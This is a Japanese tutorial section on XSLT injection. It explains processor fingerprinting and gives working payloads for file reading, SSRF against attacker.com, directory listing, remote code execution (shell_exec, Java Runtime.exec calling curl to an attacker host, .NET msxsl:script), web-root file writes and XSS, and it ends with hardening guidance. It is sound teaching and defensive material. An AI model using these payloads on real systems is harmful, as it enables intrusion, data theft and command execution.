## XSLTインジェクション

XXE（XML外部実体参照）を学んだあなたにとって、XSLT（Extensible Stylesheet Language Transformations）インジェクションは「XMLパーサの拡張機能を悪用する」という点で親戚関係にある攻撃です。しかし攻撃面（アタックサーフェス）は大きく異なります。XXEが「XMLの構文解析（パース）」の段階を狙うのに対し、XSLTインジェクションは「XMLを別の形式へ変換する処理エンジン」そのものを乗っ取ります。この違いを理解すると、なぜ**XXE対策を施したアプリケーションでもXSLTインジェクションが刺さる**のかが腑に落ちます。

本節では、XSLT変換の仕組みから、ファイル読み取り・SSRF・リモートコード実行（RCE）に至る攻撃原理、そして防御目的での対策までを掘り下げます。なお本節はあくまで**防御目的**の解説であり、実在サービスや本番環境への無許可検証、破壊的手順を意図したものではありません。ペイロード例は「なぜ危険なのか」を仕組みレベルで理解し、自組織のコードを堅牢化するための教材として提示します。

### XSLTとは何か — まず変換エンジンを理解する

**XSLT**は、XML文書を別の形式（別のXML、HTML、プレーンテキスト、PDFの中間表現など）へ**変換（transform）**するための言語です。変換ルールを記述したファイルを**スタイルシート（XSL/XSLTファイル）**と呼びます。

処理の登場人物は3つあります。

- **ソースXML（入力データ）**: 変換される元データ。
- **XSLTスタイルシート**: 「このタグをこう出力せよ」という変換規則の集合。それ自体がXML文法で書かれている。
- **XSLTプロセッサ（変換エンジン）**: ソースXMLとスタイルシートを受け取り、規則に従って出力を生成するライブラリ／エンジン。

重要なのは、**XSLTは単なるテンプレート言語ではなく、チューリング完全に近い「プログラミング言語」**だという点です。変数、条件分岐、ループ、関数呼び出しを持ち、さらに多くの実装では「拡張関数（extension functions）」を通じてホスト言語（PHP、Java、C#など）のネイティブ関数を呼び出せます。ここがインジェクションの温床になります。

典型的なスタイルシートの骨格は次のようになります。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <html>
      <body>
        <h1><xsl:value-of select="/catalog/book/title"/></h1>
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>
```

`<xsl:value-of select="..."/>` は「XPath式を評価してその結果を出力に埋め込む」命令です。この`select`属性に渡すXPath式が**sink（入力が最終的に実行・解釈される危険な代入先）**であり、攻撃者がここを制御できると多彩な攻撃に発展します。

> 出典: XSLT Injection — https://www.acunetix.com/vulnerabilities/web/xslt-injection/
> 出典: XSLT Server Side Injection — https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations

### 脆弱性の発生条件 — なぜインジェクションになるのか

XSLTインジェクションは、**攻撃者が制御できるデータがXSLTスタイルシートの一部として、あるいはスタイルシートそのものとしてプロセッサに渡る**ときに成立します。Acunetixはこれを次のように定義しています。

> ユーザ供給の入力がXSLTの処理内容を制御するとき脆弱性が生じる。これによって攻撃者はスタイルシート変換を操作でき、不正アクセスやデータ改ざんにつながりうる。

典型的な脆弱パターンは次の2種類です。

1. **スタイルシート自体をユーザが指定・投稿できる**: レポート生成機能やドキュメント変換APIで、ユーザがアップロードしたXSLをそのまま変換に使う。
2. **スタイルシート内に動的にユーザ入力を埋め込んでいる**: サーバ側でXSLテンプレートを文字列結合で組み立てており、その中に未検証の値を差し込んでいる（SQLインジェクションと同じ「文字列連結が生む構文混入」構造）。

どちらの場合も、攻撃者が投入したXSLタグをプロセッサが**そのまま変換命令として解釈・実行**してしまう点が本質です。HackTricksは「**攻撃者が制御するXSLタグがサーバ側に保存され、その後アクセスされることで不正操作が可能になる**」と説明しています。

CWE分類は**CWE-91（XML内の特殊要素の不適切な無害化 = XML injection）**で、深刻度はCVSS 3.0で9.1（Critical）とされています。機密性・完全性への影響がともに「高」である一方、可用性への直接影響は「なし」と分類されています。

> 出典: XSLT Injection — https://www.acunetix.com/vulnerabilities/web/xslt-injection/

### プロセッサの種類とバージョン依存性

XSLTインジェクションで**何ができるか**は、使われているプロセッサの実装とバージョンに強く依存します。攻撃者がまずプロセッサを特定（フィンガープリンティング）するのはこのためです。主要な実装は次の3系統です。

- **Libxslt**（GNOMEプロジェクト）: C言語製。PHPの`XSLTProcessor`クラスが内部で使用。EXSLT拡張や`php:function`をサポートするため、PHP環境での攻撃面が広い。
- **Xalan**（Apache）: Java製。Javaのクラスをネームスペース経由で呼び出せるため、RCEにつながりやすい。
- **Saxon**（Saxonica）: Java製。XSLT 2.0/3.0を実装する事実上の標準。Java拡張関数を持つ。

加えて**.NET/Microsoft**の`System.Xml.Xsl`（MSXML/XslCompiledTransform）が独立した系統として存在します。

XSLTには**バージョン1・2・3**があり、最も普及しているのはバージョン1です。バージョン2以降でしか使えない機能（`unparsed-text()`、`xsl:result-document`など）があるため、バージョンの見極めも攻撃可否を左右します。

> 出典: XSLT Server Side Injection — https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations

### フィンガープリンティング — プロセッサとバージョンの特定

XSLTには標準関数`system-property()`があり、プロセッサのバージョンやベンダー名を返します。これを出力させることで実装を特定できます。

```xml
<xsl:value-of select="system-property('xsl:version')"/>
<xsl:value-of select="system-property('xsl:vendor')"/>
<xsl:value-of select="system-property('xsl:product-name')"/>
```

- `xsl:version` は `1.0` / `2.0` / `3.0` のようなサポートバージョンを返す。→ バージョン2以降専用機能が使えるか判断できる。
- `xsl:vendor` は `libxslt` / `SAXON` / `Apache Software Foundation` などベンダー名を返す。→ どの拡張関数を試すか決まる。
- `xsl:product-name` は製品名を返す（実装により未対応）。

**なぜこれで判別できるのか**: `system-property()`はXSLT仕様が定める標準関数で、引数にプロセッサ内部のメタ情報名を取り、その値を返します。ベンダーは自身を識別するプロパティを実装しているため、出力を見るだけで裏で動くエンジンが判明します。特定後の戦略は次のとおりです。

- **libxslt/GNOME**: `document()`、`exsl:document`、`php:function()` を試す。
- **Saxon**: `unparsed-text()`、`xsl:result-document`、Java拡張を試す。
- **Xalan**: `http://xml.apache.org/xalan/java` などのJavaネームスペースを試す。
- **.NET/Microsoft**: `document()` と `msxsl:script` を試す。

> 出典: XSLT Server Side Injection — https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations

### 攻撃1: ローカルファイル読み取り

最も基本的かつ影響の大きい攻撃です。複数の経路があり、プロセッサに応じて使い分けます。

#### `document()` 関数を使う

`document()`はXSLTの標準関数で、本来は「外部XMLを読み込んで変換に組み込む」ためのものです。

```xml
<xsl:value-of select="document('/etc/passwd')"/>
```

**なぜファイルが読めるのか**: `document()`はURI（ファイルパスやURL）を引数に取り、その場所のリソースをフェッチしてノードツリーとして返します。パスにローカルファイルを指定すれば、プロセッサはそのファイルをネットワーク／ファイルシステムから取得します。ただし`document()`は**取得内容をXMLとしてパースしようとする**ため、`/etc/passwd`のような非XMLファイルはパースエラーになり、そのままでは読めないことが多い点に注意が必要です（HackTricksも「`document()`は妥当なXMLを期待するため、非XMLファイルはパースに失敗しうる」と明記）。

#### `unparsed-text()` を使う（XSLT 2.0以降 / Saxon・libxslt）

```xml
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
```

**なぜ非XMLでも読めるのか**: `unparsed-text()`はXSLT 2.0で導入された関数で、その名のとおり**対象をパースせずプレーンテキストとして丸ごと読み込む**ためのものです。第2引数でエンコーディングを指定します。`document()`と違いXML妥当性を要求しないので、`/etc/passwd`や設定ファイル、ソースコードなど任意のテキストファイルを読み出せてしまいます。これが2.0系プロセッサでファイル読み取りに最適な理由です。

#### PHP拡張関数を使う（libxslt + PHP）

```xml
<xsl:value-of select="php:function('file_get_contents','/path/to/file')"/>
```

**なぜPHP関数が呼べるのか**: PHPの`XSLTProcessor`は`registerPHPFunctions()`が有効な場合、XSLT内から`php:function`ネームスペースを通じて**任意のPHP関数を呼び出せる**ようになります。`file_get_contents()`はXML妥当性を一切気にせずファイル内容を文字列で返すため、確実な読み取り手段になります。これは後述するRCEへの入り口でもあります。

#### XXEと組み合わせる

スタイルシート自体もXML文書なので、DOCTYPE宣言を仕込めば従来のXXEも成立します。

```xml
<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "/etc/passwd">]>
<xsl:template match="/">&ext_file;</xsl:template>
```

**なぜ有効か**: スタイルシートをロードする際、プロセッサはこれをXMLとしてパースします。その過程で外部実体`ext_file`が`/etc/passwd`を指すよう定義され、`&ext_file;`の参照箇所に展開されます。**XXE対策はソースXMLのパーサにだけ施され、スタイルシートのパーサには施されていない**ことが多く、この非対称性が攻撃を通します（後述「パーサの非対称性」参照）。

> 出典: XSLT Server Side Injection — https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations

### 攻撃2: SSRF・ポートスキャン

`document()`や`xsl:include`はローカルパスだけでなく**URL**も受け付けます。これがそのままSSRF（サーバサイドリクエストフォージェリ）になります。

```xml
<!-- 攻撃者サーバから外部スタイルシートを読み込ませる -->
<xsl:include href="http://attacker.com/external.xsl"/>

<!-- 内部サービスへアクセスさせる -->
<xsl:include href="http://127.0.0.1:8000/xslt"/>

<!-- ポートスキャン: 開いているか応答/エラーの差で判定 -->
<xsl:value-of select="document('http://example.com:22')"/>
```

**なぜSSRFになるのか**: これらの関数はURIスキームを解釈してHTTP等のリクエストをサーバ自身から送出します。攻撃者は宛先を自由に指定できるため、サーバから見て到達可能な内部ネットワーク（`127.0.0.1`、クラウドメタデータエンドポイント、内部管理画面など）へアクセスさせられます。ポートスキャンでは、接続成功・拒否・タイムアウトそれぞれで返るエラーメッセージや応答時間が異なることを利用し、内部ホストの開放ポートを推測できます。`xsl:include`は攻撃者のXSLを丸ごと読み込ませ、より複雑な後続攻撃を注入する足がかりにもなります。

> 出典: XSLT Server Side Injection — https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations

### 攻撃3: ディレクトリ一覧（PHP環境）

libxslt + PHPでは、PHPのディレクトリ操作関数を呼び出してファイル一覧を取得できます。

```xml
<xsl:value-of select="php:function('opendir','/path/to/dir')"/>
<xsl:value-of select="php:function('readdir')"/>
```

`scandir()`と`assert()`を組み合わせる手法もあります。

```xml
<xsl:copy-of select="php:function('assert','var_dump(scandir(chr(46).chr(47)))==3')"/>
```

**なぜ動くのか**: `php:function`経由で任意PHP関数が呼べる前提のもと、`opendir`/`readdir`はディレクトリハンドルとエントリ名を返します。`assert()`は歴史的に**引数の文字列をPHPコードとして評価**する（PHP 7.xまでの挙動）ため、`scandir(chr(46).chr(47))`（`chr(46)`は`.`、`chr(47)`は`/`で、つまり`scandir("./")`）が実行され、カレントディレクトリの内容が`var_dump`で出力されます。`chr()`を使うのは、XSLT/XMLコンテキストでスラッシュやドットを直接書くと構文衝突やフィルタに引っかかる場合を回避する定石です。

> 出典: XSLT Server Side Injection — https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations

### 攻撃4: リモートコード実行（RCE）

XSLTインジェクションの最悪シナリオです。拡張関数がホスト言語のプロセス起動関数へ到達すると、任意コマンド実行になります。

#### PHP（libxslt）

```xml
<xsl:value-of select="php:function('shell_exec','id')"/>
```

`shell_exec`はシェルコマンドを実行し標準出力を返すため、`php:function`が有効なら一撃でRCEです。

#### Xalan-Java（ブラインドRCE）

```xml
<xsl:variable name="r" select="rt:getRuntime()"/>
<xsl:value-of select="rt:exec($r,'bash -c curl http://attacker/')"/>
```

**なぜJava環境で刺さるのか**: XalanやSaxonはXSLT内から**Javaクラスを直接インスタンス化・呼び出しできる拡張**を持ちます。`rt`ネームスペースを`java.lang.Runtime`にマッピングし、`getRuntime().exec(...)`を呼べば任意プロセスを起動できます。出力がHTTPレスポンスに現れない「ブラインド」な状況でも、`curl`で攻撃者サーバへコールバックさせればコマンド実行を確認できます。

#### Saxon Java拡張

```xml
<xsl:variable name="r" select="rt:getRuntime()"/>
<xsl:value-of select="rt:exec($r,'bash -c id > /tmp/pwned')"/>
```

これはSaxonの設定`ALLOW_EXTERNAL_FUNCTIONS`が有効な場合に成立します。**逆に言えば、この設定を無効化すれば外部Java関数呼び出しを封じられる**という重要な防御ポイントでもあります。

#### .NET `msxsl:script`（.NET Framework限定）

```xml
<msxsl:script language="C#" implements-prefix="user"><![CDATA[
public string run(){System.Diagnostics.Process.Start("cmd.exe","/c ping attacker"); return "ok";}
]]></msxsl:script>
```

**なぜ・どのバージョンで動くのか**: `msxsl:script`はMicrosoftの拡張で、スタイルシート内に**C#/VB.NETのコードを埋め込んで実行**できる機能です。埋め込みコードから`Process.Start`を呼べば任意プログラムを起動できます。ただしこれは**.NET Frameworkのみ**で動作し、**.NET Core 5以降では未サポート**です（スクリプト機能そのものが移植されなかったため）。したがって攻撃可否がランタイム世代に強く依存する典型例で、時事的にはレガシーな.NET Framework環境が狙われます。

> 出典: XSLT Server Side Injection — https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations

### 攻撃5: ファイル書き込み

読み取り・実行だけでなく、任意ファイル書き込みも可能です。Webルート配下にWebシェルを書き込めれば、拡張関数が無効でもRCEに至れます。

```xml
<!-- XSLT 2.0: xsl:result-document -->
<xsl:result-document href="local_file.txt">
<xsl:text>Write Local File</xsl:text>
</xsl:result-document>

<!-- libxslt: exsl:document（EXSLT拡張） -->
<exsl:document href="/var/www/html/test.txt" method="text">
0xdf was here!
</exsl:document>

<!-- Xalan-J: redirect拡張 -->
<redirect:open file="local_file.txt"/>
<redirect:write file="local_file.txt">Write Local File</redirect:write>
<redirect:close file="local_file.txt"/>
```

**なぜ書き込めるのか**: これらは本来「変換結果を複数の出力ファイルに分割して書き出す」ための正当な機能（secondary output / multiple output documents）です。`xsl:result-document`はXSLT 2.0標準、`exsl:document`はEXSLT拡張、`redirect`はXalan独自拡張です。`href`/`file`属性に任意パスを渡せるため、Webルートや起動スクリプトの場所に攻撃者制御のコンテンツを書き込めてしまいます。

なお、これらのペイロードをXML内に生成する際は**URLエンコードではなくXMLエンコード（`&`は`&amp;`）を使う**必要があります。これはペイロードがXML文書の一部として解釈されるためで、URLエンコードすると`%26`のような文字列がそのままリテラルになり意図どおり動きません。

> 出典: XSLT Server Side Injection — https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations

### 攻撃6: XSS（変換出力がHTMLの場合）

XSLTの出力がそのままブラウザに返るHTMLなら、スクリプトを注入できます。

```xml
<xsl:template match="/">
<script>confirm("XSS");</script>
</xsl:template>
```

**なぜXSSになるのか**: XSLTの主用途のひとつはXML→HTML変換です。攻撃者がテンプレートに`<script>`を混入させると、それが変換結果のHTMLにそのまま出力され、被害者のブラウザで実行されます。サーバサイドの変換結果がクライアントに配信される構成では、XSLTインジェクションはXSSの供給源にもなります。

> 出典: XSLT Server Side Injection — https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations

### パーサの非対称性 — XXE対策済みでもXSLTが刺さる理由

本節の冒頭で触れた最重要ポイントです。HackTricksは次の観点を強調しています。

> アプリケーションによっては、入力XMLのパースを堅牢化する一方でXSLTプロセッサは無防備なまま放置している。XXEが失敗する場合でも、プロセッサ固有の関数（`system-property()`、`document()`）や拡張関数・EXSLT要素を試す。`xsl:import`/`xsl:include`はアクセス制御フックより前にパースされる点にも注意。

**なぜこの非対称が生まれるのか**: 多くの開発者は「XMLの脅威 = XXE」と捉え、ソースXMLをパースするパーサに対してのみ`FEATURE_SECURE_PROCESSING`やDTD無効化などのハードニングを施します。しかしXSLT変換は**別のコンポーネント（変換エンジン）**が担い、そこには同じ防御が適用されていないことが多いのです。結果として、ソースXMLでXXEが弾かれても、スタイルシート側から`document()`やEXSLT関数を使えば同等以上の攻撃が通ります。さらに`xsl:import`/`xsl:include`は変換処理の**アクセス制御チェックより前の段階**でリソースを読み込むため、後段のフックでは止められないケースがあります。この「守る場所を1箇所間違えると全体が破れる」構造こそ、XSLTインジェクションを理解すべき理由です。

> 出典: XSLT Server Side Injection — https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations

### 防御 — XSLTプロセッサを安全に構成する

Acunetixの公式ガイダンスは端的に「**XSLTプロセッサを再構成してこれらの攻撃から保護せよ**」です。具体化すると次のとおりです。

#### 1. 信頼できないスタイルシートを処理しない（最重要）

そもそも**ユーザ供給のXSLをプロセッサに渡さない**のが根本対策です。変換ロジックはサーバ側で固定し、ユーザにはデータ（ソースXML）だけを渡させる設計にします。SQLインジェクションで「クエリ構造を固定しユーザ値だけをパラメータ化する」のと同じ発想です。

#### 2. 拡張関数・スクリプトを無効化する

- **PHP/libxslt**: `XSLTProcessor::registerPHPFunctions()`を呼ばない。呼ぶ場合も許可する関数を限定する（PHP 5.4+では引数で許可リストを渡せる）。`shell_exec`や`file_get_contents`が呼べない状態にする。
- **Java/Saxon**: `ALLOW_EXTERNAL_FUNCTIONS`を無効化し、`rt:getRuntime()`のようなJavaリフレクション経由の呼び出しを封じる。
- **Java/JAXP全般**: `TransformerFactory`に`FEATURE_SECURE_PROCESSING`を有効化し、`XMLConstants.ACCESS_EXTERNAL_DTD`・`ACCESS_EXTERNAL_STYLESHEET`を空文字（`""`）に設定して外部リソース参照を禁止する。
- **.NET**: `XsltSettings.EnableScript`と`EnableDocumentFunction`を`false`のままにする（既定は無効）。信頼できないスタイルシートでは絶対に有効化しない。

#### 3. 外部リソースアクセスを遮断する

`document()`・`xsl:include`・`xsl:import`が外部URI／ローカルファイルへアクセスできないよう、プロセッサのリソースリゾルバ（`URIResolver`など）を制限し、ネットワークegressやファイルシステムアクセスを最小権限に絞ります。これはSSRF・ファイル読み取り・リモートスタイルシート読み込みを一括で塞ぎます。

#### 4. 入力の検証とサンドボックス化

スタイルシートに動的値を埋め込む設計を避けられない場合は、値を厳格に検証し、XML特殊文字を適切にエスケープします。加えて変換処理を**最小権限のサンドボックス**（限定ユーザ、seccomp/コンテナ、ネットワーク遮断）で実行し、万一の突破時の被害を封じ込めます。

#### 5. XXE対策と「同じ守りをXSLT側にも」適用する

前節の非対称性を踏まえ、ソースXMLパーサに施したDTD無効化・外部実体禁止と**同等の防御をスタイルシートのパーサと変換エンジンの双方に**適用します。守る場所の抜けをなくすことが要点です。

> 出典: XSLT Injection — https://www.acunetix.com/vulnerabilities/web/xslt-injection/
> 出典: XSLT Server Side Injection — https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations

### まとめ

- XSLTインジェクションは、XMLを別形式へ変換する**変換エンジン**を攻撃者が操る脆弱性（CWE-91、CVSS 3.0で9.1相当のCritical）。
- 影響はプロセッサ（libxslt/Xalan/Saxon/.NET）とバージョン（XSLT 1/2/3、.NET Framework vs Core）に強く依存するため、攻撃者は`system-property()`でフィンガープリントする。
- 主な攻撃は、**ファイル読み取り**（`unparsed-text()`・`document()`・`php:function`・XXE）、**SSRF/ポートスキャン**（`document()`・`xsl:include`）、**ディレクトリ一覧**、**RCE**（`php:function('shell_exec')`・Java `Runtime.exec`・.NET `msxsl:script`）、**ファイル書き込み**（`xsl:result-document`・`exsl:document`・`redirect`）、そして出力HTML経由の**XSS**。
- 最大の教訓は**パーサの非対称性**: XXE対策をソースXMLだけに施し、スタイルシート／変換エンジンを無防備に放置すると全体が破れる。
- 防御の核心は「信頼できないXSLを処理しない」「拡張関数・スクリプト・外部リソースアクセスを無効化する」「XXE対策を変換エンジン側にも徹底する」こと。
